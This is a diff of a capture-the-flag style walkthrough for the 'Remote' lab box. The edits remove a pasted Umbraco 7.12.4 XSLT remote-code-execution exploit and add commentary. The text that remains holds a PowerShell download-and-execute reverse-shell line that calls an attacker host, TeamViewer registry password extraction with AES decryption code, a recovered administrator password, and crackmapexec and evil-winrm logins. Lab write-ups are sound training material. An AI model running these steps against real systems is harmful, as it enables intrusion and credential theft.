@@ -103,7 +103,7 @@ https://github.com/umbraco/Umbraco-CMS
 
 ![[Pasted image 20230220203431.png]]
 
-## feroxbuster
+## Feroxbuster
 nothing interesting
 
 ## SMB
@@ -171,75 +171,12 @@ Umbraco v8.14.1 - 'baseU | aspx/webapps/50462.txt
 ------------------------- ---------------------------------
 Shellcodes: No Results
 ```
+Use 46153.py
 
-```
-#Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators
-# Dork: N/A
-# Date: 2019-01-13
-# Exploit Author: Gregory DRAPERI & Hugo BOUTINON
-# Vendor Homepage: http://www.umbraco.com/
-# Software Link: https://our.umbraco.com/download/releases
-# Version: 7.12.4
-# Category: Webapps
-# Tested on: Windows IIS
-# CVE: N/A
-
-
-import requests;
-
-from bs4 import BeautifulSoup;
-
-def print_dict(dico):
-    print(dico.items());
-
-print("Start");
-
-# Execute a calc for the PoC
-payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
-xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
-xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
-<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
-{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
- proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;\
- proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
- proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
- </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
- </xsl:template> </xsl:stylesheet> ';
-
-login = "XXXX;
-password="XXXX";
-host = "XXXX";
-
-# Step 1 - Get Main page
-s = requests.session()
-url_main =host+"/umbraco/";
-r1 = s.get(url_main);
-print_dict(r1.cookies);
-
-# Step 2 - Process Login
-url_login = host+"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin";
-loginfo = {"username":login,"password":password};
-r2 = s.post(url_login,json=loginfo);
-
-# Step 3 - Go to vulnerable web page
-url_xslt = host+"/umbraco/developer/Xslt/xsltVisualize.aspx";
-r3 = s.get(url_xslt);
-
-soup = BeautifulSoup(r3.text, 'html.parser');
-VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];
-VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];
-UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
-headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};
-data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};
-
-# Step 4 - Launch the attack
-r4 = s.post(url_xslt,data=data,headers=headers);
-
-print("End");      
-```
-
-###
-```
+### Modify exploit
+The below is the original payload
+``` python
+46153.py
 # Execute a calc for the PoC
 payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
@@ -253,9 +190,9 @@ xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
  </xsl:template> </xsl:stylesheet> ';
 ```
 
-to
-
-```
+we need to modify it to
+``` python
+poc_ping.py
 # Execute a calc for the PoC
 payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
@@ -271,6 +208,7 @@ xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
 
 ### Ping PoC
 
+On Kali Shell 1
 ```
 python3 poc_ping.py
 Start
@@ -278,6 +216,7 @@ Start
 End
 ```
 
+On Kali Shell 2
 ```
 sudo tcpdump -i tun0 icmp
 [sudo] password for kali: 
@@ -294,7 +233,9 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 ```
 
 ## Get reverse shell
-```
+Replace the string cmd part
+```python
+revshell.py
 string cmd = "/c powershell -c iex(new-object net.webclient).downloadstring(\'http://10.10.14.17:8000/shell.ps1\')"
 ```
 needed to escape quotes in downloadstring
@@ -306,14 +247,15 @@ iis apppool\defaultapppool
 PS C:\windows\system32\inetsrv> 
 ```
 
-## flag
+## User flag
 ```
 PS C:\Users\Public> type user.txt
 ```
 
 # Privilege Escalation
-
 ## Enumeration
+reference 
+https://0xdf.gitlab.io/2020/09/05/htb-remote.html
 
 ### Check tasks
 ```
@@ -373,7 +315,7 @@ powershell.exe                4196                            0    126,888 K
 tasklist.exe                  7632                            0      7,600 K
 ```
 
-Teamviewer??
+Teamviewer is something unusual.
 
 ### Teamviewer Location
 ```
@@ -386,16 +328,19 @@ d-----        2/27/2020  10:35 AM                Version7
 ```
 
 
-## Version7
+### TeamViewer Version7
 
+Check the metasploit exploit code.
 ```
 https://github.com/rapid7/metasploit-framework/blob/master//modules/post/windows/gather/credentials/teamviewer_passwords.rb
 ```
 
+Registry is the key for exploitation.
 ```
 cd HKLM:\software\wow6432node\teamviewer\version7
 ```
 
+In version7 folder we can get itemproperty.
 ```
 get-itemproperty -path .
 
@@ -428,6 +373,7 @@ PSDrive                   : HKLM
 PSProvider                : Microsoft.PowerShell.Core\Registry
 ```
 
+We extract SecurityPassword
 ```
 (get-itemproperty -path .).SecurityPasswordAES
 255
@@ -463,7 +409,9 @@ PSProvider                : Microsoft.PowerShell.Core\Registry
 78
 91
 ```
-## Decode
+
+## Decode AES
+In the same github, we see the part where the metasploit code decrypt the ciphered text, so we write some quick python code.
 
 ```python
 #!/usr/bin/env python3
@@ -480,9 +428,9 @@ password = aes.decrypt(encrypted).decode("utf-16").rstrip("\x00")
 print(password)
                  
 ```
-`!R3m0te!`
+`!R3m0te!` is the password
 
-### Crackmap
+## Crackmap
 ```
  crackmapexec smb remote.htb -u administrator -p '!R3m0te!'
 /usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
@@ -492,8 +440,9 @@ SMB         remote.htb      445    REMOTE           [+] remote\administrator:!R3
                                   
 ```
 
-### Evilwinrm
-
+## Evil-winrm
+`evil-winrm -u administrator -p '!R3m0te!' -i remote.htb
+`
 ```
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
 ```
